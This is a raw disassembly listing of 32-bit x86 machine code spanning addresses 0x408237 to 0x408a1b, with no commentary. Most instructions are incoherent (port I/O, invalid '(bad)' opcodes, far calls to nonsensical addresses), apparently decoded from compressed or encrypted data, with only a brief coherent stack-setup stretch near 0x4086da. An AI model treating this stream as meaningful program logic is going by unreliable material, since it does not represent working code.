  408237:	xor    BYTE PTR [ebp-0x7b],ah
  40823a:	push   0xd6423425
  40823f:	mov    edi,0x8ac61546
  408244:	mov    ebx,0x4c2b2c71
  408249:	lahf   
  40824a:	rcl    al,1
  40824c:	ret    0x34ea
  40824f:	mov    WORD PTR [edi],gs
  408251:	jecxz  0x4081e9
  408253:	mov    ebx,0x7410b8b8
  408258:	jne    0x40823d
  40825a:	mov    eax,0xe98acb89
  40825f:	lods   eax,DWORD PTR ds:[esi]
  408260:	in     eax,dx
  408261:	call   0x7a6d1939
  408266:	push   edx
  408267:	lock adc al,0x5c
  40826a:	cli    
  40826b:	sbb    DWORD PTR [esi+0xd48b512],ebx
  408271:	adc    BYTE PTR [ebx-0x39150582],ah
  408277:	dec    esp
  408278:	loopne 0x4082f9
  40827a:	xchg   DWORD PTR [edx+0x67],esp
  40827d:	xor    BYTE PTR [ebp+0x546e3601],cl
  408283:	jbe    0x408215
  408285:	repnz push cs
  408287:	in     al,dx
  408288:	cld    
  408289:	vpaddd ymm6,ymm7,YMMWORD PTR [edi-0x42220f7a]
  408291:	in     al,0x43
  408293:	push   esp
  408294:	test   eax,0x882e92d0
  408299:	inc    edi
  40829a:	pop    ss
  40829b:	jl     0x4082fd
  40829d:	jno    0x40827f
  40829f:	jnp    0x40827d
  4082a1:	aas    
  4082a2:	xchg   BYTE PTR [ebx+0x48d72d58],al
  4082a8:	lock shl BYTE PTR [ecx-0x64],cl
  4082ac:	pushf  
  4082ad:	cmp    DWORD PTR [ebx],0x351e307a
  4082b3:	inc    ecx
  4082b4:	in     al,dx
  4082b5:	stos   DWORD PTR es:[edi],eax
  4082b6:	jo     0x408328
  4082b8:	(bad)  
  4082b9:	fdiv   DWORD PTR [edx-0x16baffa2]
  4082bf:	sbb    DWORD PTR ds:0xb4ddd8b2,edx
  4082c5:	in     al,dx
  4082c6:	push   ds
  4082c7:	jb     0x408317
  4082c9:	inc    ecx
  4082ca:	ret    
  4082cb:	pop    es
  4082cc:	mov    esi,0x6f9e5fce
  4082d1:	jae    0x408307
  4082d3:	ins    BYTE PTR es:[edi],dx
  4082d4:	inc    esi
  4082d5:	out    0x6b,eax
  4082d7:	and    DWORD PTR [eax+ebp*4-0x3d],ebp
  4082db:	sahf   
  4082dc:	push   ds
  4082dd:	ins    BYTE PTR es:[edi],dx
  4082de:	sub    eax,0x5fdcc5cb
  4082e3:	jae    0x408318
  4082e5:	and    DWORD PTR [ebp+edx*1+0x1b67955a],ecx
  4082ec:	sti    
  4082ed:	and    ebx,esi
  4082ef:	add    DWORD PTR [ebx],edi
  4082f1:	xor    al,0xc6
  4082f3:	xchg   esi,eax
  4082f4:	data16 out dx,al
  4082f6:	sbb    ecx,esi
  4082f8:	mov    dl,0xf5
  4082fa:	adc    BYTE PTR [edi+0x30],dh
  4082fd:	sbb    DWORD PTR [ecx-0x6044f5b3],edi
  408303:	cmc    
  408304:	hlt    
  408305:	daa    
  408306:	data16 test al,0xeb
  408309:	adc    al,0x94
  40830b:	shl    dh,1
  40830d:	sbb    eax,DWORD PTR [edi-0x468cfff3]
  408313:	(bad)  
  408315:	adc    dl,0xea
  408318:	test   BYTE PTR [ebp-0x68b41b65],ch
  40831e:	jmp    0x3b06fc7f
  408323:	jg     0x408318
  408325:	mov    ds:0xb01b6d31,al
  40832a:	and    esi,DWORD PTR [ebx-0x29096347]
  408330:	or     BYTE PTR [ebx],cl
  408332:	cmc    
  408333:	dec    eax
  408334:	mov    dh,0x9e
  408336:	sbb    BYTE PTR [edi+0x57],0x9a
  40833a:	xor    ah,BYTE PTR [eax+0x3f391109]
  408340:	mov    bl,0x3a
  408342:	push   0xe1d1935c
  408347:	cmp    DWORD PTR [esi-0x3ac46f4f],esi
  40834d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40834e:	xchg   esi,eax
  40834f:	push   ebp
  408350:	add    ecx,DWORD PTR [ebp-0x2a]
  408353:	dec    esi
  408354:	xor    eax,ebp
  408356:	pop    ebx
  408357:	(bad)  
  408358:	cmp    DWORD PTR [ebp+0x10],ebp
  40835b:	mov    WORD PTR [edx],ss
  40835d:	stc    
  40835e:	in     eax,0xb5
  408360:	retf   
  408361:	mov    al,0x28
  408363:	aam    0x8
  408365:	xor    al,0xb9
  408367:	pop    eax
  408368:	sub    ebp,DWORD PTR [esi]
  40836a:	imul   eax,DWORD PTR [esi],0x443ff134
  408370:	outs   dx,BYTE PTR ds:[esi]
  408371:	ins    DWORD PTR es:[edi],dx
  408372:	push   esi
  408373:	sti    
  408374:	xchg   edi,eax
  408375:	fwait
  408376:	lds    esp,FWORD PTR [eax+0x929c29f]
  40837c:	sbb    eax,0xce0cc1a8
  408381:	cs leave 
  408383:	sete   BYTE PTR [eax+0x73]
  408387:	mov    BYTE PTR [esi+0x21],bl
  40838a:	mov    ecx,0x19ae8dea
  40838f:	adc    esi,edx
  408391:	sti    
  408392:	mov    edi,0xd0ea31ae
  408397:	mov    es,WORD PTR [ebx-0x57]
  40839a:	adc    al,0x5f
  40839c:	int3   
  40839d:	pop    ds
  40839e:	cmp    edi,esi
  4083a0:	push   ax
  4083a2:	xor    DWORD PTR [ebx-0x623744c3],ebx
  4083a8:	pop    edi
  4083a9:	inc    edx
  4083aa:	test   al,0x6
  4083ac:	inc    esp
  4083ad:	or     ecx,DWORD PTR ss:[ebp-0x3f]
  4083b1:	iret   
  4083b2:	jge    0x4083d0
  4083b4:	shl    DWORD PTR [ecx+0x2b],0x73
  4083b8:	les    ecx,FWORD PTR [eax-0x79]
  4083bb:	pop    esp
  4083bc:	das    
  4083bd:	adc    edi,DWORD PTR [esi+edi*4-0x21]
  4083c1:	or     DWORD PTR [edx+0x75328a75],0xb2122013
  4083cb:	popf   
  4083cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083cd:	jle    0x4083d4
  4083cf:	int    0x5b
  4083d1:	or     eax,0xf756be67
  4083d6:	sbb    BYTE PTR [ebp-0x5208384b],bl
  4083dc:	mov    eax,ds:0xd9a5970f
  4083e1:	jb     0x4083fe
  4083e3:	addr16 xchg ebx,eax
  4083e5:	je     0x408420
  4083e7:	sahf   
  4083e8:	push   es
  4083e9:	div    DWORD PTR [edi+0x76]
  4083ec:	jge    0x408442
  4083ee:	shl    DWORD PTR [ebx+eiz*4+0x27],0xc0
  4083f3:	mov    al,0xc4
  4083f5:	fldln2 
  4083f7:	pop    edi
  4083f8:	adc    DWORD PTR [edi],edi
  4083fa:	out    0xde,al
  4083fc:	icebp  
  4083fd:	jecxz  0x4083eb
  4083ff:	mov    ebp,0x219e5e0c
  408404:	leave  
  408405:	test   BYTE PTR [eax+0x4e44d9ed],bl
  40840b:	iret   
  40840c:	test   eax,0x20320b2d
  408411:	mov    gs,WORD PTR [ebx+0x4bfeb0f4]
  408417:	outs   dx,BYTE PTR ds:[esi]
  408418:	mov    ecx,0xdfadbf56
  40841d:	outs   dx,BYTE PTR ds:[esi]
  40841e:	push   0x6ccb6f00
  408423:	inc    edx
  408424:	pusha  
  408425:	jns    0x408483
  408427:	(bad)  
  408428:	xchg   esp,eax
  408429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40842a:	test   DWORD PTR [edx],ebx
  40842c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40842d:	add    DWORD PTR [ecx+0x620ea0d7],ecx
  408433:	ja     0x408425
  408435:	inc    esp
  408436:	cdq    
  408437:	inc    ebx
  408438:	jne    0x40840a
  40843a:	or     BYTE PTR ds:0x70bd4256,bh
  408440:	fidiv  WORD PTR [eax+edx*1+0x6c]
  408444:	call   0x9900:0x1fd959ad
  40844b:	jb     0x408442
  40844d:	shr    DWORD PTR [edx+0x39301bc8],0xf8
  408454:	icebp  
  408455:	repz adc DWORD PTR [edi],ebp
  408458:	xor    eax,0x5588d010
  40845d:	rol    DWORD PTR [edx-0x9649d6d],cl
  408463:	les    eax,FWORD PTR [eax-0x61df7dc4]
  408469:	push   ds
  40846a:	xor    ebp,DWORD PTR [ebp+eiz*8-0x2e2d931d]
  408471:	fnsave [ebx-0x20]
  408474:	push   ss
  408475:	and    BYTE PTR [esp+eiz*2+0x3205f945],bl
  40847c:	xor    dh,ch
  40847e:	cdq    
  40847f:	stos   BYTE PTR es:[edi],al
  408480:	fdiv   QWORD PTR ds:0xdb7664f2
  408486:	jl     0x4084a8
  408488:	aam    0x9a
  40848a:	adc    al,BYTE PTR [ebx]
  40848c:	shl    BYTE PTR [esi-0x45685a71],0x75
  408493:	sbb    BYTE PTR ds:0x161f34b3,ah
  408499:	pop    es
  40849a:	out    0x40,al
  40849c:	add    al,0x4d
  40849e:	mov    DWORD PTR [ecx-0x4c],edx
  4084a1:	mov    bh,0x51
  4084a3:	jne    0x408428
  4084a5:	or     edi,DWORD PTR [eax+esi*4+0x27]
  4084a9:	icebp  
  4084aa:	gs ret 
  4084ac:	retf   
  4084ad:	add    BYTE PTR [edx+0x57ec4ebd],al
  4084b3:	fild   QWORD PTR [ecx+0x4f84ccce]
  4084b9:	or     eax,DWORD PTR cs:[ebx+0x1438c301]
  4084c0:	icebp  
  4084c1:	cmp    ecx,DWORD PTR [esi-0x29]
  4084c4:	sbb    DWORD PTR [ebx+0x6467f8bb],0x5f
  4084cb:	dec    eax
  4084cc:	das    
  4084cd:	nop
  4084ce:	aad    0x5
  4084d0:	inc    ebx
  4084d1:	add    al,0xc4
  4084d3:	mov    DWORD PTR [esi-0x24],ecx
  4084d6:	mov    al,ds:0x56a05def
  4084db:	push   edx
  4084dc:	and    al,0xe
  4084de:	(bad)  
  4084df:	xchg   edi,eax
  4084e0:	mov    ds,WORD PTR [edx+edx*8]
  4084e3:	repnz es inc eax
  4084e6:	outs   dx,DWORD PTR ds:[esi]
  4084e7:	sbb    ch,0x23
  4084ea:	popa   
  4084eb:	sub    eax,0xf9ae7de2
  4084f0:	je     0x408504
  4084f2:	stc    
  4084f3:	fsubr  QWORD PTR [ecx+0x62]
  4084f6:	ss lock inc edi
  4084f9:	out    0xa5,eax
  4084fb:	test   BYTE PTR [ebx+0x23],0xc
  4084ff:	xchg   ebp,eax
  408500:	sub    ebp,DWORD PTR [eax]
  408502:	push   esi
  408503:	mov    ds:0xc1f8e3e6,al
  408508:	hlt    
  408509:	test   al,0xf8
  40850b:	mov    ecx,0xe4b5ad18
  408510:	mov    dl,BYTE PTR [esi-0x33]
  408513:	mov    gs,WORD PTR [ebp+0x41c8a0f1]
  408519:	cmp    eax,0xe194f36
  40851e:	enter  0x9104,0x69
  408522:	call   0x9f1f:0xfe
  408528:	into   
  408529:	pop    es
  40852a:	mov    bl,0xac
  40852c:	dec    ebx
  40852d:	in     eax,dx
  40852e:	out    dx,eax
  40852f:	add    dl,BYTE PTR [edi]
  408531:	or     eax,0x3021d5d0
  408536:	jge    0x408556
  408538:	xchg   ebx,eax
  408539:	ret    0x5173
  40853c:	cmp    edx,DWORD PTR [eax]
  40853e:	rcl    DWORD PTR [ecx+eiz*4+0x6a08ac2e],cl
  408545:	sar    BYTE PTR [edi+0x39e4976a],0x85
  40854c:	sbb    ebx,DWORD PTR [eax+eiz*4-0x6e]
  408550:	push   ebx
  408551:	idiv   edx
  408553:	popa   
  408554:	into   
  408555:	dec    ebp
  408556:	push   0xc55624fd
  40855b:	sbb    eax,0x2c621d0b
  408560:	imul   ecx,DWORD PTR [edi+0x25d3306f],0x20
  408567:	clc    
  408568:	sti    
  408569:	adc    ch,cl
  40856b:	fild   DWORD PTR [ebx+0x5]
  40856e:	fdiv   DWORD PTR [edx-0x8]
  408571:	push   ecx
  408572:	adc    al,0xd6
  408574:	gs xchg esi,eax
  408576:	sbb    DWORD PTR [ebp-0x168619a0],esp
  40857c:	push   esi
  40857d:	out    dx,eax
  40857e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40857f:	lahf   
  408580:	push   0xda5eaa9d
  408585:	jmp    0xf2eec
  40858a:	lock mov ebp,DWORD PTR [edx+0x22]
  40858e:	data16 ja 0x40860a
  408591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408592:	mov    ds:0xc6cf8f4f,al
  408597:	(bad)  
  408598:	push   esp
  408599:	in     eax,dx
  40859a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40859b:	outs   dx,DWORD PTR ds:[esi]
  40859c:	pop    esi
  40859d:	pop    esp
  40859e:	sub    BYTE PTR [esp+edx*2+0x7e],ah
  4085a2:	pop    ss
  4085a3:	ror    DWORD PTR [esi-0x5bf34905],cl
  4085a9:	retf   0x47ed
  4085ac:	jl     0x4085ce
  4085ae:	adc    eax,0x4f450910
  4085b3:	in     al,dx
  4085b4:	stos   BYTE PTR es:[edi],al
  4085b5:	cwde   
  4085b6:	sbb    ebx,DWORD PTR [ebp+0x0]
  4085b9:	mov    bl,0xfe
  4085bb:	pop    ebx
  4085bc:	xor    eax,0xe45eb398
  4085c1:	lods   eax,DWORD PTR ds:[esi]
  4085c2:	enter  0xc8eb,0x28
  4085c6:	xor    al,0xbe
  4085c8:	jo     0x408556
  4085ca:	add    al,0x48
  4085cc:	int3   
  4085cd:	(bad)  
  4085ce:	pusha  
  4085cf:	call   0xf740:0x55b19cda
  4085d6:	les    ebx,FWORD PTR [edi-0x6a71113e]
  4085dc:	adc    bl,BYTE PTR [eax+0xa8ff043]
  4085e2:	add    ch,BYTE PTR [edx]
  4085e4:	bound  esi,QWORD PTR [ebp-0x25]
  4085e7:	xor    ch,BYTE PTR [esi-0x735a1b44]
  4085ed:	sbb    DWORD PTR [edx-0x5a2812c9],esp
  4085f3:	sbb    eax,0xcebb100c
  4085f8:	mov    cl,dh
  4085fa:	ins    DWORD PTR es:[edi],dx
  4085fb:	cli    
  4085fc:	int    0x27
  4085fe:	fstp   QWORD PTR [ebp+0x8]
  408601:	sub    BYTE PTR [eax-0xc11e9bf],0x9e
  408608:	mov    es,WORD PTR [ebp-0x4b4ff0e3]
  40860e:	cmovg  esp,DWORD PTR [edi+0x6e]
  408612:	xchg   ecx,eax
  408613:	pop    es
  408614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408615:	rcr    BYTE PTR [ecx+0x5a],cl
  408618:	inc    ecx
  408619:	(bad)  
  40861a:	in     eax,dx
  40861b:	and    edi,DWORD PTR [edx]
  40861d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40861e:	add    ch,BYTE PTR [ebx-0xd]
  408621:	rcl    DWORD PTR [ebx],0x3e
  408624:	inc    esp
  408625:	and    dh,cl
  408627:	jl     0x40865e
  408629:	sub    edx,DWORD PTR [edx+0x1a832ca5]
  40862f:	cmp    eax,0x24d2df35
  408634:	cmp    eax,0x42519fab
  408639:	(bad)  
  40863a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40863b:	mov    al,ds:0x49d450f6
  408640:	ins    DWORD PTR es:[edi],dx
  408641:	cmc    
  408642:	jle    0x4085d6
  408644:	ins    BYTE PTR es:[edi],dx
  408645:	xchg   DWORD PTR [ebx+eiz*4],esp
  408648:	inc    ebp
  408649:	rol    BYTE PTR ds:0xfcdcb906,cl
  40864f:	fmul   DWORD PTR [edi+0x2a]
  408652:	adc    al,0x88
  408654:	sbb    eax,0x1fb349e4
  408659:	(bad)  
  40865a:	cmp    bh,BYTE PTR [eax-0x7274ce53]
  408660:	cdq    
  408661:	into   
  408662:	push   eax
  408663:	addr16 mov eax,0x4bda3306
  408669:	sti    
  40866a:	ins    DWORD PTR es:[edi],dx
  40866b:	mov    eax,ds:0xfca25fc3
  408670:	mov    cl,0x8b
  408672:	repnz mov ss:0x83838a91,al
  408679:	shl    esp,cl
  40867b:	mul    ebx
  40867d:	mov    WORD PTR [eax+0x37],es
  408680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408681:	ja     0x408625
  408683:	fwait
  408684:	enter  0x6f16,0x18
  408688:	sub    eax,0xce5962b4
  40868d:	and    al,0x2d
  40868f:	arpl   WORD PTR [ecx+0x2],sp
  408692:	jg     0x4086c1
  408694:	nop
  408695:	imul   edi,edi,0x21
  408698:	(bad)  
  40869a:	and    ch,BYTE PTR [esi+esi*8+0x18ebbf4b]
  4086a1:	lahf   
  4086a2:	add    ah,bl
  4086a4:	mov    bh,0x2c
  4086a6:	lods   eax,DWORD PTR ds:[esi]
  4086a7:	sbb    BYTE PTR [esi-0x1474e134],dl
  4086ad:	outs   dx,DWORD PTR ds:[esi]
  4086ae:	jmp    DWORD PTR [esi-0x61]
  4086b1:	(bad)  
  4086b2:	je     0x40869a
  4086b4:	loope  0x4086e9
  4086b6:	rol    dl,0x55
  4086b9:	adc    ebp,esi
  4086bb:	shr    BYTE PTR [ecx-0x5f],1
  4086be:	dec    ebx
  4086bf:	ss dec edx
  4086c1:	test   BYTE PTR [edi-0x2f],ch
  4086c4:	jbe    0x4086d9
  4086c6:	inc    edx
  4086c7:	aaa    
  4086c8:	xchg   edi,eax
  4086c9:	xchg   edi,eax
  4086ca:	test   al,0x33
  4086cc:	inc    eax
  4086cd:	call   0x61f733d0
  4086d2:	pop    es
  4086d3:	out    dx,al
  4086d4:	fwait
  4086d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086d7:	fisubr DWORD PTR [edx+0x3]
  4086da:	xor    edx,edx
  4086dc:	pop    edx
  4086dd:	add    edx,0x8
  4086e0:	push   edx
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0x863e91c7
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	bound  edi,QWORD PTR [eax]
  40871f:	mov    ebx,0x72bb12d1
  408724:	pop    ss
  408725:	inc    eax
  408726:	ret    0x88eb
  408729:	push   ax
  40872b:	jne    0x408702
  40872d:	lods   eax,DWORD PTR gs:[esi]
  40872f:	in     eax,0x3c
  408731:	xchg   DWORD PTR [esi-0x35],ebp
  408734:	push   esp
  408735:	pop    ecx
  408736:	lds    edi,FWORD PTR [edi+0x67015447]
  40873c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40873d:	cmp    DWORD PTR [ebp+0x5],edi
  408740:	loopne 0x4087be
  408742:	out    0x65,eax
  408744:	mov    bl,0x7e
  408746:	adc    eax,0xd0fe098c
  40874b:	push   es
  40874c:	push   ebp
  40874d:	imul   edx,DWORD PTR [ebx-0x4000238c],0xd98774b7
  408757:	lea    ecx,[si-0xc03]
  40875c:	inc    eax
  40875d:	lahf   
  40875e:	dec    edx
  40875f:	cmp    BYTE PTR [eax-0x56e379fe],ah
  408765:	int3   
  408766:	or     dh,ah
  408768:	imul   eax,DWORD PTR [eax-0x73],0x64c86196
  40876f:	leave  
  408770:	or     edi,DWORD PTR [ebx+0x16dcaac3]
  408776:	les    esp,FWORD PTR [edx-0x5e]
  408779:	adc    BYTE PTR [ecx+0x4f],0xa7
  40877d:	xchg   DWORD PTR [edi],ecx
  40877f:	int3   
  408780:	jge    0x408752
  408782:	mov    dl,0xf7
  408784:	fdiv   st(7),st
  408786:	and    cl,dh
  408788:	add    DWORD PTR [esi+edi*4],ebx
  40878b:	int    0xf7
  40878d:	cmp    dh,BYTE PTR [esi-0x2ed8b27e]
  408793:	mov    ebx,0xff887dc6
  408798:	inc    ebx
  408799:	sbb    eax,DWORD PTR [esi+0x3363661d]
  40879f:	dec    ebp
  4087a0:	mov    cl,0x2f
  4087a2:	loop   0x4087c5
  4087a4:	inc    esp
  4087a5:	popf   
  4087a6:	dec    ecx
  4087a7:	rcr    bl,1
  4087a9:	pop    edx
  4087aa:	and    BYTE PTR [eax+0x51],cl
  4087ad:	mov    eax,ds:0x6372700f
  4087b2:	hlt    
  4087b3:	add    BYTE PTR [eax],ah
  4087b5:	clc    
  4087b6:	out    0x4f,eax
  4087b8:	cmp    BYTE PTR [ecx],ch
  4087ba:	add    dl,BYTE PTR [ecx]
  4087bc:	dec    ecx
  4087bd:	xor    al,0xe9
  4087bf:	dec    esi
  4087c0:	fwait
  4087c1:	into   
  4087c2:	mov    bh,0x75
  4087c4:	outs   dx,DWORD PTR ds:[esi]
  4087c5:	out    dx,eax
  4087c6:	jmp    0x854:0x39ae88fc
  4087cd:	mov    dl,0x6a
  4087cf:	pusha  
  4087d0:	pusha  
  4087d1:	in     eax,dx
  4087d2:	jecxz  0x408812
  4087d4:	push   ss
  4087d5:	sub    al,0x50
  4087d7:	inc    edi
  4087d8:	xchg   esp,eax
  4087d9:	and    dh,dl
  4087db:	fisub  WORD PTR [ebx+0x36]
  4087de:	out    0xf7,eax
  4087e0:	out    dx,al
  4087e1:	push   edi
  4087e2:	cmp    esp,DWORD PTR [ecx]
  4087e4:	add    al,0xbb
  4087e6:	add    dl,bh
  4087e8:	cmp    dl,BYTE PTR [eax+0x6e]
  4087eb:	cmp    eax,0xd489718
  4087f0:	loopne 0x40884a
  4087f2:	push   ds
  4087f3:	ret    0x7543
  4087f6:	scas   al,BYTE PTR es:[edi]
  4087f7:	(bad)  
  4087f8:	adc    eax,0x4f00dea6
  4087fd:	mov    ds:0x6a70a9ad,eax
  408802:	int    0x15
  408804:	xor    eax,0x4f9c23a6
  408809:	stos   BYTE PTR es:[edi],al
  40880a:	add    BYTE PTR [ebx],bh
  40880c:	stos   BYTE PTR es:[edi],al
  40880d:	sbb    dh,BYTE PTR [eax-0x4c]
  408810:	jbe    0x4087a9
  408812:	push   es
  408813:	add    eax,0x2f7ea69c
  408818:	or     eax,0xe723e021
  40881d:	(bad)  
  40881e:	cli    
  40881f:	leave  
  408820:	xchg   ebx,eax
  408821:	jmp    0x5a94c463
  408826:	sbb    al,0x95
  408828:	popf   
  408829:	jmp    0x926af839
  40882e:	xchg   ebx,eax
  40882f:	fcom   QWORD PTR [esp+ebx*1-0x26]
  408833:	fs pop ds
  408835:	or     eax,0x4b872316
  40883a:	adc    ah,cl
  40883c:	test   eax,0xcf86cacf
  408841:	pop    ss
  408842:	xchg   edx,eax
  408843:	ja     0x4087e4
  408845:	retf   
  408846:	mov    eax,0x8a6910f5
  40884b:	lods   al,BYTE PTR ds:[esi]
  40884c:	pop    ds
  40884d:	add    ebp,ebp
  40884f:	xor    ecx,ecx
  408851:	and    eax,0xf447adf0
  408856:	arpl   WORD PTR [esi],bx
  408858:	ins    BYTE PTR es:[edi],dx
  408859:	cmp    eax,0xe5f988f
  40885e:	xchg   BYTE PTR [esi],cl
  408860:	mov    ah,0x2f
  408862:	or     eax,0x720aace8
  408867:	das    
  408868:	call   0x581c:0xfe207878
  40886f:	push   edx
  408870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408871:	mov    ds:0x85723a35,al
  408876:	(bad)  
  408877:	push   edx
  408878:	xchg   ebp,eax
  408879:	mov    ebx,0xdc56bd45
  40887e:	dec    edx
  40887f:	adc    ch,BYTE PTR [eax+0x1b]
  408882:	jo     0x408868
  408884:	jae    0x408823
  408886:	inc    ecx
  408887:	push   ds
  408888:	mov    edx,0xf29a2322
  40888d:	cmc    
  40888e:	cs cmp eax,0x61c2cccf
  408894:	add    DWORD PTR [ebp+0x30e42f],0xd9c032e7
  40889e:	jg     0x408882
  4088a0:	arpl   bx,si
  4088a2:	je     0x4088bd
  4088a4:	ins    BYTE PTR es:[edi],dx
  4088a5:	sub    DWORD PTR [esi+0x44],0x5f8f03ad
  4088ac:	jmp    0x93c49bca
  4088b1:	push   ebx
  4088b2:	and    al,bh
  4088b4:	jmp    DWORD PTR [edi]
  4088b6:	and    BYTE PTR [esi-0x15],cl
  4088b9:	mov    ah,0x1b
  4088bb:	push   cs
  4088bc:	sar    esp,0x47
  4088bf:	jge    0x408843
  4088c1:	(bad)  
  4088c2:	cmp    DWORD PTR [ecx],ebp
  4088c4:	retf   0x3ef2
  4088c7:	mov    ds:0x98affb2a,eax
  4088cc:	mov    ecx,eax
  4088ce:	je     0x408905
  4088d0:	out    dx,eax
  4088d1:	pushaw 
  4088d3:	aas    
  4088d4:	xor    DWORD PTR [ebx+0x45],eax
  4088d7:	and    esi,DWORD PTR [edx-0x4b]
  4088da:	nop
  4088db:	sub    al,0xf7
  4088dd:	add    esp,DWORD PTR [ecx]
  4088df:	rcl    DWORD PTR [edi-0x3d],0xa7
  4088e3:	scas   al,BYTE PTR es:[edi]
  4088e4:	pop    ebx
  4088e5:	inc    edx
  4088e6:	mov    ecx,0x776c6bf7
  4088eb:	xor    eax,0x485a7090
  4088f0:	std    
  4088f1:	mov    ?,WORD PTR ds:0x2fa5750c
  4088f8:	adc    edx,esi
  4088fa:	jnp    0x40888c
  4088fc:	aaa    
  4088fd:	pop    ebp
  4088fe:	sar    DWORD PTR [edx-0x6e270a6c],0xef
  408905:	test   al,0xf7
  408907:	add    al,BYTE PTR ds:0xb10cddb7
  40890d:	into   
  40890e:	push   ecx
  40890f:	ds mov edx,0xd7cfc5fb
  408915:	dec    edx
  408916:	out    0x39,eax
  408918:	xlat   BYTE PTR ds:[ebx]
  408919:	in     eax,dx
  40891a:	mov    bl,0x8c
  40891c:	push   0x8da565f7
  408921:	std    
  408922:	fld    DWORD PTR [ebx-0x63]
  408925:	inc    esi
  408926:	clc    
  408927:	mov    eax,ds:0x789e2922
  40892c:	stos   DWORD PTR es:[edi],eax
  40892d:	jge    0x40892d
  40892f:	mov    ds:0x64add459,eax
  408934:	push   ecx
  408935:	loope  0x4088e6
  408937:	es out dx,eax
  408939:	pusha  
  40893a:	sbb    al,0x8c
  40893c:	pop    esp
  40893d:	mov    WORD PTR [edx],ss
  40893f:	std    
  408940:	push   es
  408941:	mov    edi,0xcf3290b6
  408946:	xchg   esi,edi
  408948:	jmp    0x74012f61
  40894d:	mov    eax,0x7c7d4a5b
  408952:	imul   eax,DWORD PTR [ebx-0x7a],0x4b9aa64c
  408959:	(bad)  [edi+0x31ff0623]
  40895f:	rol    BYTE PTR [ebp-0x1d],cl
  408962:	popf   
  408963:	xor    DWORD PTR [ebx-0x70],0xced122cf
  40896a:	call   0x6035:0x9a14937
  408971:	or     al,0xa3
  408973:	mov    eax,ds:0xe08a25f
  408978:	cmp    DWORD PTR [ebp-0x607670aa],eax
  40897e:	lods   al,BYTE PTR ds:[esi]
  40897f:	push   ss
  408980:	pop    ds
  408981:	xchg   BYTE PTR [ebp+0x78],bh
  408984:	dec    edi
  408985:	jmp    0xbc0eae33
  40898a:	mov    BYTE PTR [eax],bh
  40898c:	and    al,0x7c
  40898e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40898f:	fwait
  408990:	std    
  408991:	jecxz  0x408a01
  408993:	jp     0x40894c
  408995:	pusha  
  408996:	inc    ecx
  408997:	adc    edx,DWORD PTR [ecx-0x68f297f8]
  40899d:	sbb    ecx,DWORD PTR [esi+0x35]
  4089a0:	sti    
  4089a1:	adc    ah,BYTE PTR [esi-0x2]
  4089a4:	js     0x40896d
  4089a6:	xchg   DWORD PTR [ebp+0x49841594],esp
  4089ac:	cmp    al,0x71
  4089ae:	xchg   edi,eax
  4089af:	xchg   edx,eax
  4089b0:	add    DWORD PTR [ebx+eiz*2-0x11],0x8fc1c242
  4089b8:	pusha  
  4089b9:	pop    esi
  4089ba:	and    DWORD PTR [edx+0x3697c37d],edi
  4089c0:	push   ss
  4089c1:	sti    
  4089c2:	inc    ecx
  4089c3:	fwait
  4089c4:	call   0x3a7:0xb33c559
  4089cb:	data16 mov al,ds:0xf717e8a1
  4089d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089d2:	fst    QWORD PTR [edi]
  4089d4:	pop    edx
  4089d5:	add    ebx,ebx
  4089d7:	mov    bl,0xaa
  4089d9:	dec    edi
  4089da:	xlat   BYTE PTR ds:[bx]
  4089dc:	mov    ecx,0xf86765c1
  4089e1:	push   es
  4089e2:	push   ebp
  4089e3:	xchg   edx,eax
  4089e4:	mov    ch,0x1e
  4089e6:	pop    ds
  4089e7:	retf   0x965f
  4089ea:	mov    bl,0xe0
  4089ec:	xchg   ebp,eax
  4089ed:	mov    edi,0x824709a6
  4089f2:	(bad)  
  4089f3:	int3   
  4089f4:	xchg   edx,eax
  4089f5:	pop    esp
  4089f6:	clc    
  4089f7:	jmp    DWORD PTR [eax+0x7e]
  4089fa:	sahf   
  4089fb:	sub    BYTE PTR [ebx],dh
  4089fd:	shl    BYTE PTR [edi-0x4f],1
  408a00:	mov    edx,0x9afda1c6
  408a05:	and    esp,ecx
  408a07:	sub    ebx,DWORD PTR [ecx]
  408a09:	and    al,dl
  408a0b:	sbb    dl,dl
  408a0d:	mov    eax,ds:0x44b312e
  408a12:	rcl    dh,cl
  408a14:	pop    edx
  408a15:	mov    bl,0x49
  408a17:	push   ebx
  408a18:	ins    BYTE PTR es:[edi],dx
  408a19:	out    0x29,eax
  408a1b:	shr    DWORD PTR [edi],0x84
